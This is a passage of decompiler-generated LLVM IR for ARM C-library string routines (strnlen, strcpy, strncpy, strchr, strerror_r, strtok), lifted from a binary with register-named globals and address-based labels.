  br i1 %v2_15944, label %dec_label_pc_1594c, label %dec_label_pc_158a8

dec_label_pc_1594c:                               ; preds = %dec_label_pc_15944
  store i32 %v6_15860, i32* @r5, align 4
  store i32 %v9_15860, i32* @r6, align 4
  ret i32 %v1_158fc

dec_label_pc_15950:                               ; preds = %dec_label_pc_15874, %dec_label_pc_158c8, %dec_label_pc_158b4
  store i32 %v6_15860, i32* @r5, align 4
  store i32 %v9_15860, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15924, { 0, 2, 1 }
  uselistorder i32 %v1_15920, { 1, 0 }
  uselistorder i32 %v1_158fc, { 2, 1, 0 }
  uselistorder i8 %v3_158dc.pn, { 1, 0 }
  uselistorder i8* %v3_158dc.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 3, 2, 1, 0, 4 }
  uselistorder i8 %v3_158d0, { 1, 0 }
  uselistorder i32 %v1_158d0, { 0, 2, 1 }
  uselistorder i32 %v1_15874, { 0, 2, 1 }
  uselistorder i8 %v3_15864, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_15860, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_15860, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15950, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15904, { 1, 0 }
  uselistorder label %dec_label_pc_158e4, { 1, 0 }
  uselistorder label %dec_label_pc_158dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_158b4, { 1, 0 }
  uselistorder label %dec_label_pc_158d4.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_15958 = icmp eq i32 %arg2, 0
  br i1 %v2_15958, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  %v2_1596c = add i32 %tmp, %arg2
  %v3_1596c = icmp ult i32 %v2_1596c, %tmp
  br i1 %v3_1596c, label %bb19, label %bb20

bb19:                                             ; preds = %.thread
  br label %bb20

bb20:                                             ; preds = %.thread, %bb19
  %v5_15a1c = phi i32 [ %v2_1596c, %.thread ], [ -1, %bb19 ]
  %v1_1599c3 = urem i32 %tmp, 4
  %v2_1599c4 = icmp eq i32 %v1_1599c3, 0
  br i1 %v2_1599c4, label %dec_label_pc_159a4, label %dec_label_pc_1597c

dec_label_pc_1597c:                               ; preds = %bb20, %dec_label_pc_15998
  %v1_15988 = phi i32 [ %v1_15998, %dec_label_pc_15998 ], [ %tmp, %bb20 ]
  %v1_1597c = inttoptr i32 %v1_15988 to i8*
  %v2_1597c = load i8, i8* %v1_1597c, align 1
  %v2_15980 = icmp eq i8 %v2_1597c, 0
  br i1 %v2_15980, label %dec_label_pc_15988, label %dec_label_pc_15998

dec_label_pc_15988:                               ; preds = %dec_label_pc_1597c
  %v3_15988 = icmp uge i32 %v5_15a1c, %v1_15988
  %v9_15988 = icmp eq i32 %v5_15a1c, %v1_15988
  %v2_1598c = xor i1 %v3_15988, true
  %v3_1598c = or i1 %v9_15988, %v2_1598c
  br i1 %v3_1598c, label %bb21, label %bb22

bb21:                                             ; preds = %dec_label_pc_15988
  %v6_1598c = sub i32 %v5_15a1c, %tmp
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_15988, %bb21
  %v5_15990 = phi i32 [ %v1_15988, %dec_label_pc_15988 ], [ %v6_1598c, %bb21 ]
  %v2_15990 = xor i1 %v9_15988, true
  %v3_15990 = and i1 %v3_15988, %v2_15990
  br i1 %v3_15990, label %bb23, label %bb24

bb23:                                             ; preds = %bb22
  %v6_15990 = sub i32 %v5_15990, %tmp
  br label %bb24

bb24:                                             ; preds = %bb22, %bb23
  %v8_15994 = phi i32 [ %v5_15990, %bb22 ], [ %v6_15990, %bb23 ]
  ret i32 %v8_15994

dec_label_pc_15998:                               ; preds = %dec_label_pc_1597c
  %v1_15998 = add i32 %v1_15988, 1
  %v1_1599c = urem i32 %v1_15998, 4
  %v2_1599c = icmp eq i32 %v1_1599c, 0
  br i1 %v2_1599c, label %dec_label_pc_159a4, label %dec_label_pc_1597c

dec_label_pc_159a4:                               ; preds = %dec_label_pc_15998, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_15998, %dec_label_pc_15998 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_15a0833 = icmp ult i32 %storemerge.lcssa, %v5_15a1c
  br i1 %v3_15a0833, label %dec_label_pc_159ac, label %dec_label_pc_15a18

dec_label_pc_159ac:                               ; preds = %dec_label_pc_15a04, %dec_label_pc_159a4
  %v0_159fc40 = phi i32 [ %v4_159ac, %dec_label_pc_15a04 ], [ %storemerge.lcssa, %dec_label_pc_159a4 ]
  %v1_159ac = inttoptr i32 %v0_159fc40 to i32*
  %v2_159ac = load i32, i32* %v1_159ac, align 4
  %v4_159ac = add i32 %v0_159fc40, 4
  store i32 %v4_159ac, i32* @lr, align 4
  %v2_159b0 = add i32 %v2_159ac, -16843009
  %v2_159b4 = and i32 %v2_159b0, -2139062144
  %v2_159b8 = icmp eq i32 %v2_159b4, 0
  br i1 %v2_159b8, label %dec_label_pc_15a04, label %dec_label_pc_159c0

dec_label_pc_159c0:                               ; preds = %dec_label_pc_159ac
  %v2_159c0 = inttoptr i32 %v0_159fc40 to i8*
  %v3_159c0 = load i8, i8* %v2_159c0, align 1
  %v2_159c4 = icmp eq i8 %v3_159c0, 0
  br i1 %v2_159c4, label %bb25, label %dec_label_pc_159d4

bb25:                                             ; preds = %dec_label_pc_159c0
  br label %dec_label_pc_15a18

dec_label_pc_159d4:                               ; preds = %dec_label_pc_159c0
  %v1_159d4 = add i32 %v0_159fc40, 1
  %v2_159d4 = inttoptr i32 %v1_159d4 to i8*
  %v3_159d4 = load i8, i8* %v2_159d4, align 1
  %v2_159d8 = icmp eq i8 %v3_159d4, 0
  br i1 %v2_159d8, label %dec_label_pc_15a18, label %dec_label_pc_159e4

dec_label_pc_159e4:                               ; preds = %dec_label_pc_159d4
  %v1_159e4 = add i32 %v0_159fc40, 2
  %v2_159e4 = inttoptr i32 %v1_159e4 to i8*
  %v3_159e4 = load i8, i8* %v2_159e4, align 1
  %v2_159e8 = icmp eq i8 %v3_159e4, 0
  br i1 %v2_159e8, label %dec_label_pc_15a18, label %dec_label_pc_159f4

dec_label_pc_159f4:                               ; preds = %dec_label_pc_159e4
  %v1_159f4 = add i32 %v0_159fc40, 3
  %v2_159f4 = inttoptr i32 %v1_159f4 to i8*
  %v3_159f4 = load i8, i8* %v2_159f4, align 1
  %v2_159f8 = icmp eq i8 %v3_159f4, 0
  br i1 %v2_159f8, label %dec_label_pc_15a18, label %dec_label_pc_15a04

dec_label_pc_15a04:                               ; preds = %dec_label_pc_159f4, %dec_label_pc_159ac
  %v3_15a08 = icmp ult i32 %v4_159ac, %v5_15a1c
  br i1 %v3_15a08, label %dec_label_pc_159ac, label %dec_label_pc_15a18

dec_label_pc_15a18:                               ; preds = %dec_label_pc_15a04, %dec_label_pc_159a4, %dec_label_pc_159d4, %dec_label_pc_159e4, %dec_label_pc_159f4, %bb25
  %v1_15a18 = phi i32 [ %v0_159fc40, %bb25 ], [ %storemerge.lcssa, %dec_label_pc_159a4 ], [ %v1_159d4, %dec_label_pc_159d4 ], [ %v1_159e4, %dec_label_pc_159e4 ], [ %v1_159f4, %dec_label_pc_159f4 ], [ %v5_15a1c, %dec_label_pc_15a04 ]
  %v3_15a18 = icmp uge i32 %v5_15a1c, %v1_15a18
  %v9_15a18 = icmp eq i32 %v5_15a1c, %v1_15a18
  %v2_15a1c = xor i1 %v3_15a18, true
  %v3_15a1c = or i1 %v9_15a18, %v2_15a1c
  br i1 %v3_15a1c, label %bb26, label %bb27

bb26:                                             ; preds = %dec_label_pc_15a18
  %v6_15a1c = sub i32 %v5_15a1c, %tmp
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_15a18, %bb26
  %v5_15a20 = phi i32 [ %v1_15a18, %dec_label_pc_15a18 ], [ %v6_15a1c, %bb26 ]
  %v2_15a20 = xor i1 %v9_15a18, true
  %v3_15a20 = and i1 %v3_15a18, %v2_15a20
  br i1 %v3_15a20, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v6_15a20 = sub i32 %v5_15a20, %tmp
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v8_15a24 = phi i32 [ %v5_15a20, %bb27 ], [ %v6_15a20, %bb28 ]
  ret i32 %v8_15a24

; uselistorder directives
  uselistorder i1 %v3_15a18, { 1, 0 }
  uselistorder i32 %v4_159ac, { 1, 2, 0 }
  uselistorder i32 %v0_159fc40, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15998, { 1, 0, 2 }
  uselistorder i1 %v3_15988, { 1, 0 }
  uselistorder i32 %v1_15988, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_15a1c, { 3, 4, 5, 0, 2, 1, 6, 7, 8 }
  uselistorder i32 %tmp, { 4, 3, 5, 2, 1, 7, 8, 0, 6 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %dec_label_pc_15a18, { 0, 4, 3, 2, 5, 1 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1597c, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_15a401 = load i32, i32* @r1, align 4
  %v1_15a402 = inttoptr i32 %v0_15a401 to i8*
  %v2_15a403 = load i8, i8* %v1_15a402, align 1
  %v2_15a445 = icmp eq i8 %v2_15a403, 0
  store i1 %v2_15a445, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_15a403, i8* %arg1, align 1
  br i1 %v2_15a445, label %dec_label_pc_15a50, label %dec_label_pc_15a38

dec_label_pc_15a38:                               ; preds = %entry, %dec_label_pc_15a38
  %v0_15a38 = load i32, i32* @r1, align 4
  %v1_15a38 = add i32 %v0_15a38, 1
  store i32 %v1_15a38, i32* @r1, align 4
  %v0_15a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_15a3c = add i32 %v0_15a3c, 1
  store i32 %v1_15a3c, i32* %r2.global-to-local, align 4
  %v1_15a40 = inttoptr i32 %v1_15a38 to i8*
  %v2_15a40 = load i8, i8* %v1_15a40, align 1
  %v2_15a44 = icmp eq i8 %v2_15a40, 0
  store i1 %v2_15a44, i1* %cpsr_z.global-to-local, align 1
  %v3_15a48 = inttoptr i32 %v1_15a3c to i8*
  store i8 %v2_15a40, i8* %v3_15a48, align 1
  %v0_15a4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a4c, label %dec_label_pc_15a50, label %dec_label_pc_15a38

dec_label_pc_15a50:                               ; preds = %dec_label_pc_15a38, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15a38, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_15a54 = icmp eq i32 %arg2, 3
  store i1 %v7_15a54, i1* %cpsr_z.global-to-local, align 1
  %v1_15a5c = add i32 %arg1, -1
  store i32 %v1_15a5c, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_15ad8, label %dec_label_pc_15a64

dec_label_pc_15a64:                               ; preds = %entry
  %v3_15a64 = udiv i32 %arg2, 4
  store i32 %v3_15a64, i32* @lr, align 4
  %v0_15a68.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15a68

dec_label_pc_15a68:                               ; preds = %dec_label_pc_15ab4, %dec_label_pc_15a64
  %v2_15a70 = phi i32 [ %v6_15aa8, %dec_label_pc_15ab4 ], [ %v1_15a5c, %dec_label_pc_15a64 ]
  %v0_15a68 = phi i32 [ %v1_15ab8, %dec_label_pc_15ab4 ], [ %v0_15a68.pre, %dec_label_pc_15a64 ]
  %v1_15a68 = inttoptr i32 %v0_15a68 to i8*
  %v2_15a68 = load i8, i8* %v1_15a68, align 1
  %v3_15a68 = zext i8 %v2_15a68 to i32
  store i32 %v3_15a68, i32* %r3.global-to-local, align 4
  %v2_15a6c = icmp eq i8 %v2_15a68, 0
  store i1 %v2_15a6c, i1* %cpsr_z.global-to-local, align 1
  %v3_15a70 = add i32 %v2_15a70, 1
  %v4_15a70 = inttoptr i32 %v3_15a70 to i8*
  store i8 %v2_15a68, i8* %v4_15a70, align 1
  %v5_15a70 = load i32, i32* @ip, align 4
  %v6_15a70 = add i32 %v5_15a70, 1
  store i32 %v6_15a70, i32* @ip, align 4
  %v0_15a74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a74, label %dec_label_pc_15ac4, label %dec_label_pc_15a78

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a68
  %v0_15a78 = load i32, i32* @r1, align 4
  %v1_15a78 = add i32 %v0_15a78, 1
  %v2_15a78 = inttoptr i32 %v1_15a78 to i8*
  %v3_15a78 = load i8, i8* %v2_15a78, align 1
  %v4_15a78 = zext i8 %v3_15a78 to i32
  store i32 %v4_15a78, i32* %r3.global-to-local, align 4
  %v2_15a7c = icmp eq i8 %v3_15a78, 0
  store i1 %v2_15a7c, i1* %cpsr_z.global-to-local, align 1
  %v3_15a80 = add i32 %v5_15a70, 2
  %v4_15a80 = inttoptr i32 %v3_15a80 to i8*
  store i8 %v3_15a78, i8* %v4_15a80, align 1
  %v5_15a80 = load i32, i32* @ip, align 4
  %v6_15a80 = add i32 %v5_15a80, 1
  store i32 %v6_15a80, i32* @ip, align 4
  %v0_15a84 = load i32, i32* @r1, align 4
  %v1_15a84 = add i32 %v0_15a84, 1
  store i32 %v1_15a84, i32* %r1.global-to-local, align 4
  %v0_15a88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a88, label %dec_label_pc_15ac4, label %dec_label_pc_15a8c

dec_label_pc_15a8c:                               ; preds = %dec_label_pc_15a78
  %v1_15a8c = add i32 %v0_15a84, 2
  %v2_15a8c = inttoptr i32 %v1_15a8c to i8*
  %v3_15a8c = load i8, i8* %v2_15a8c, align 1
  %v4_15a8c = zext i8 %v3_15a8c to i32
  store i32 %v4_15a8c, i32* %r3.global-to-local, align 4
  %v2_15a90 = icmp eq i8 %v3_15a8c, 0
  store i1 %v2_15a90, i1* %cpsr_z.global-to-local, align 1
  %v3_15a94 = add i32 %v5_15a80, 2
  %v4_15a94 = inttoptr i32 %v3_15a94 to i8*
  store i8 %v3_15a8c, i8* %v4_15a94, align 1
  %v5_15a94 = load i32, i32* @ip, align 4
  %v6_15a94 = add i32 %v5_15a94, 1
  store i32 %v6_15a94, i32* @ip, align 4
  %v0_15a98 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a98 = add i32 %v0_15a98, 1
  store i32 %v1_15a98, i32* %r1.global-to-local, align 4
  %v0_15a9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a9c, label %dec_label_pc_15ac4, label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %dec_label_pc_15a8c
  %v1_15aa0 = add i32 %v0_15a98, 2
  %v2_15aa0 = inttoptr i32 %v1_15aa0 to i8*
  %v3_15aa0 = load i8, i8* %v2_15aa0, align 1
  %v4_15aa0 = zext i8 %v3_15aa0 to i32
  store i32 %v4_15aa0, i32* %r3.global-to-local, align 4
  %v2_15aa4 = icmp eq i8 %v3_15aa0, 0
  store i1 %v2_15aa4, i1* %cpsr_z.global-to-local, align 1
  %v3_15aa8 = add i32 %v5_15a94, 2
  %v4_15aa8 = inttoptr i32 %v3_15aa8 to i8*
  store i8 %v3_15aa0, i8* %v4_15aa8, align 1
  %v5_15aa8 = load i32, i32* @ip, align 4
  %v6_15aa8 = add i32 %v5_15aa8, 1
  store i32 %v6_15aa8, i32* @ip, align 4
  %v0_15aac = load i32, i32* %r1.global-to-local, align 4
  %v1_15aac = add i32 %v0_15aac, 1
  store i32 %v1_15aac, i32* %r1.global-to-local, align 4
  %v0_15ab0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ab0, label %dec_label_pc_15ac4, label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15aa0
  %v0_15ab4 = load i32, i32* @lr, align 4
  %v1_15ab4 = add i32 %v0_15ab4, -1
  store i32 %v1_15ab4, i32* @lr, align 4
  %v7_15ab4 = icmp eq i32 %v0_15ab4, 1
  store i1 %v7_15ab4, i1* %cpsr_z.global-to-local, align 1
  %v1_15ab8 = add i32 %v0_15aac, 2
  store i32 %v1_15ab8, i32* @r1, align 4
  br i1 %v7_15ab4, label %dec_label_pc_15ad8, label %dec_label_pc_15a68

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_15aa0, %dec_label_pc_15a8c, %dec_label_pc_15a78, %dec_label_pc_15a68
  %v1_15ac4 = phi i32 [ %v6_15aa8, %dec_label_pc_15aa0 ], [ %v6_15a94, %dec_label_pc_15a8c ], [ %v6_15a80, %dec_label_pc_15a78 ], [ %v6_15a70, %dec_label_pc_15a68 ]
  %v2_15ac41 = sub i32 %arg1, %v1_15ac4
  %v2_15ac8 = add i32 %v2_15ac41, %arg2
  %v1_15acc = add i32 %v2_15ac8, -1
  store i32 %v1_15acc, i32* %r3.global-to-local, align 4
  %v7_15acc = icmp eq i32 %v2_15ac8, 1
  store i1 %v7_15acc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15acc, label %bb, label %dec_label_pc_15af8

bb:                                               ; preds = %dec_label_pc_15ac4
  ret i32 %arg1

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15ab4, %entry
  %v2_15ae86 = phi i32 [ %v1_15a5c, %entry ], [ %v6_15aa8, %dec_label_pc_15ab4 ]
  %v1_15ad8 = urem i32 %arg2, 4
  store i32 %v1_15ad8, i32* %r3.global-to-local, align 4
  %v2_15ad8 = icmp eq i32 %v1_15ad8, 0
  store i1 %v2_15ad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ad8, label %bb12, label %.preheader

bb12:                                             ; preds = %dec_label_pc_15ad8
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_15ad8, %._crit_edge
  %v2_15ae8 = phi i32 [ %v6_15ae8, %._crit_edge ], [ %v2_15ae86, %dec_label_pc_15ad8 ]
  %v0_15ae4 = phi i32 [ %v0_15ae4.pre, %._crit_edge ], [ %v1_15ad8, %dec_label_pc_15ad8 ]
  %v0_15ae0 = load i32, i32* @r1, align 4
  %v1_15ae0 = inttoptr i32 %v0_15ae0 to i8*
  %v2_15ae0 = load i8, i8* %v1_15ae0, align 1
  %v3_15ae0 = zext i8 %v2_15ae0 to i32
  store i32 %v3_15ae0, i32* %r2.global-to-local, align 4
  %v5_15ae0 = add i32 %v0_15ae0, 1
  store i32 %v5_15ae0, i32* @r1, align 4
  %v1_15ae4 = add i32 %v0_15ae4, -1
  store i32 %v1_15ae4, i32* %r3.global-to-local, align 4
  %v7_15ae4 = icmp eq i32 %v0_15ae4, 1
  store i1 %v7_15ae4, i1* %cpsr_z.global-to-local, align 1
  %v3_15ae8 = add i32 %v2_15ae8, 1
  %v4_15ae8 = inttoptr i32 %v3_15ae8 to i8*
  store i8 %v2_15ae0, i8* %v4_15ae8, align 1
  %v5_15ae8 = load i32, i32* @ip, align 4
  %v6_15ae8 = add i32 %v5_15ae8, 1
  store i32 %v6_15ae8, i32* @ip, align 4
  %v0_15aec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15aec, label %bb13, label %bb14

bb13:                                             ; preds = %.preheader
  ret i32 %arg1

bb14:                                             ; preds = %.preheader
  %v0_15af0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15af0 = icmp eq i32 %v0_15af0, 0
  store i1 %v2_15af0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15af0, label %dec_label_pc_15af8, label %._crit_edge

._crit_edge:                                      ; preds = %bb14
  %v0_15ae4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.preheader

dec_label_pc_15af8:                               ; preds = %bb14, %dec_label_pc_15ac4
  %v2_15b009 = phi i32 [ %v1_15ac4, %dec_label_pc_15ac4 ], [ %v6_15ae8, %bb14 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15afc

dec_label_pc_15afc:                               ; preds = %dec_label_pc_15afc.dec_label_pc_15afc_crit_edge, %dec_label_pc_15af8
  %v2_15b00 = phi i32 [ %v6_15b00, %dec_label_pc_15afc.dec_label_pc_15afc_crit_edge ], [ %v2_15b009, %dec_label_pc_15af8 ]
  %v0_15b00.off0 = phi i8 [ %extract.t, %dec_label_pc_15afc.dec_label_pc_15afc_crit_edge ], [ 0, %dec_label_pc_15af8 ]
  %v0_15afc = load i32, i32* %r3.global-to-local, align 4
  %v1_15afc = add i32 %v0_15afc, -1
  store i32 %v1_15afc, i32* %r3.global-to-local, align 4
  %v7_15afc = icmp eq i32 %v0_15afc, 1
  store i1 %v7_15afc, i1* %cpsr_z.global-to-local, align 1
  %v3_15b00 = add i32 %v2_15b00, 1
  %v4_15b00 = inttoptr i32 %v3_15b00 to i8*
  store i8 %v0_15b00.off0, i8* %v4_15b00, align 1
  %v5_15b00 = load i32, i32* @ip, align 4
  %v6_15b00 = add i32 %v5_15b00, 1
  store i32 %v6_15b00, i32* @ip, align 4
  %v0_15b04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15b04, label %dec_label_pc_15b08, label %dec_label_pc_15afc.dec_label_pc_15afc_crit_edge

dec_label_pc_15afc.dec_label_pc_15afc_crit_edge:  ; preds = %dec_label_pc_15afc
  %v0_15b00.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_15b00.pre to i8
  br label %dec_label_pc_15afc

dec_label_pc_15b08:                               ; preds = %dec_label_pc_15afc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15b00, { 1, 0 }
  uselistorder i32 %v0_15afc, { 1, 0 }
  uselistorder i32 %v6_15ae8, { 0, 2, 1 }
  uselistorder i32 %v1_15ad8, { 2, 1, 0 }
  uselistorder i32 %v2_15ac8, { 1, 0 }
  uselistorder i32 %v1_15ab8, { 1, 0 }
  uselistorder i32 %v0_15ab4, { 1, 0 }
  uselistorder i32 %v6_15aa8, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 1, 4, 5, 0, 3 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15b38:
  %v6_15b0c = load i32, i32* @r5, align 4
  %v1_15b10 = urem i32 %arg1, 256
  %v4_15b38 = mul nuw nsw i32 %v1_15b10, 256
  %v5_15b38 = or i32 %v4_15b38, %v1_15b10
  %v4_15b40 = mul i32 %v5_15b38, 65536
  %v5_15b40 = or i32 %v4_15b40, %v5_15b38
  br label %dec_label_pc_15b44

dec_label_pc_15b44:                               ; preds = %bb35, %dec_label_pc_15b80, %dec_label_pc_15b38
  %v0_15b44 = phi i32 [ %v6_15b0c, %dec_label_pc_15b38 ], [ %v4_15b44, %dec_label_pc_15b80 ], [ %v4_15b44, %bb35 ]
  %v1_15b44 = inttoptr i32 %v0_15b44 to i32*
  %v2_15b44 = load i32, i32* %v1_15b44, align 4
  %v4_15b44 = add i32 %v0_15b44, 4
  %v2_15b4c = xor i32 %v2_15b44, %v5_15b40
  %v2_15b50 = add i32 %v2_15b4c, 2130640639
  store i32 %v2_15b50, i32* @ip, align 4
  %v2_15b58 = add i32 %v2_15b44, 2130640639
  %v1_15b5c = sub i32 -1, %v2_15b44
  %v2_15b60 = xor i32 %v2_15b58, %v1_15b5c
  %v1_15b68 = sub i32 -1, %v2_15b4c
  %v2_15b6c = and i32 %v2_15b60, -2130640640
  %v2_15b70 = xor i32 %v2_15b50, %v1_15b68
  %v2_15b74 = icmp eq i32 %v2_15b6c, 0
  %v2_15b78 = and i32 %v2_15b70, -2130640640
  store i32 %v2_15b78, i32* @lr, align 4
  br i1 %v2_15b74, label %dec_label_pc_15b80, label %dec_label_pc_15b88

dec_label_pc_15b80:                               ; preds = %dec_label_pc_15b44
  %v2_15b80 = icmp eq i32 %v2_15b78, 0
  br i1 %v2_15b80, label %dec_label_pc_15b44, label %dec_label_pc_15b88

dec_label_pc_15b88:                               ; preds = %dec_label_pc_15b44, %dec_label_pc_15b80
  %v2_15b88 = inttoptr i32 %v0_15b44 to i8*
  %v3_15b88 = load i8, i8* %v2_15b88, align 1
  %v4_15b88 = zext i8 %v3_15b88 to i32
  %v9_15b8c = icmp eq i32 %v4_15b88, %v1_15b10
  br i1 %v9_15b8c, label %bb, label %bb29

bb:                                               ; preds = %dec_label_pc_15b88
  store i32 %v6_15b0c, i32* @r5, align 4
  ret i32 %v0_15b44

bb29:                                             ; preds = %dec_label_pc_15b88
  %v2_15b98 = icmp eq i8 %v3_15b88, 0
  br i1 %v2_15b98, label %dec_label_pc_15be8, label %dec_label_pc_15ba0

dec_label_pc_15ba0:                               ; preds = %bb29
  %v1_15ba0 = add i32 %v0_15b44, 1
  %v2_15ba0 = inttoptr i32 %v1_15ba0 to i8*
  %v3_15ba0 = load i8, i8* %v2_15ba0, align 1
  %v4_15ba0 = zext i8 %v3_15ba0 to i32
  %v9_15ba4 = icmp eq i32 %v4_15ba0, %v1_15b10
  br i1 %v9_15ba4, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_15ba0
  store i32 %v6_15b0c, i32* @r5, align 4
  ret i32 %v1_15ba0

bb31:                                             ; preds = %dec_label_pc_15ba0
  %v2_15bb0 = icmp eq i8 %v3_15ba0, 0
  br i1 %v2_15bb0, label %dec_label_pc_15be8, label %dec_label_pc_15bb8

dec_label_pc_15bb8:                               ; preds = %bb31
  %v1_15bb8 = add i32 %v0_15b44, 2
  %v2_15bb8 = inttoptr i32 %v1_15bb8 to i8*
  %v3_15bb8 = load i8, i8* %v2_15bb8, align 1
  %v4_15bb8 = zext i8 %v3_15bb8 to i32
  %v9_15bbc = icmp eq i32 %v4_15bb8, %v1_15b10
  br i1 %v9_15bbc, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_15bb8
  store i32 %v6_15b0c, i32* @r5, align 4
  ret i32 %v1_15bb8

bb33:                                             ; preds = %dec_label_pc_15bb8
  %v2_15bc8 = icmp eq i8 %v3_15bb8, 0
  br i1 %v2_15bc8, label %dec_label_pc_15be8, label %dec_label_pc_15bd0

dec_label_pc_15bd0:                               ; preds = %bb33
  %v1_15bd0 = add i32 %v0_15b44, 3
  %v2_15bd0 = inttoptr i32 %v1_15bd0 to i8*
  %v3_15bd0 = load i8, i8* %v2_15bd0, align 1
  %v4_15bd0 = zext i8 %v3_15bd0 to i32
  %v9_15bd4 = icmp eq i32 %v4_15bd0, %v1_15b10
  br i1 %v9_15bd4, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_15bd0
  store i32 %v6_15b0c, i32* @r5, align 4
  ret i32 %v1_15bd0

bb35:                                             ; preds = %dec_label_pc_15bd0
  %v2_15be0 = icmp eq i8 %v3_15bd0, 0
  br i1 %v2_15be0, label %dec_label_pc_15be8, label %dec_label_pc_15b44

dec_label_pc_15be8:                               ; preds = %bb35, %bb33, %bb31, %bb29
  store i32 %v6_15b0c, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_15b44, { 1, 0 }
  uselistorder i32 %v2_15b44, { 0, 2, 1 }
  uselistorder i32 %v0_15b44, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v5_15b38, { 1, 0 }
  uselistorder i32 %v1_15b10, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v6_15b0c, { 4, 1, 2, 3, 5, 0 }
  uselistorder label %dec_label_pc_15b88, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15c00 = call i32 @__xpg_strerror_r()
  %v0_15c04 = load i32, i32* @r4, align 4
  ret i32 %v0_15c04
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_3448c.1384 to i32), i32* @r2, align 4
  %v0_15c10 = call i32 @strtok_r()
  %v0_15c14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15c14, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_15c14 = load i32, i32* @ip, align 4
  %v5_15c14 = mul i32 %v2_15c14, 512
  %v6_15c14 = and i32 %v5_15c14, %arg1
  store i32 %v6_15c14, i32* @r4, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15c10

; uselistorder directives
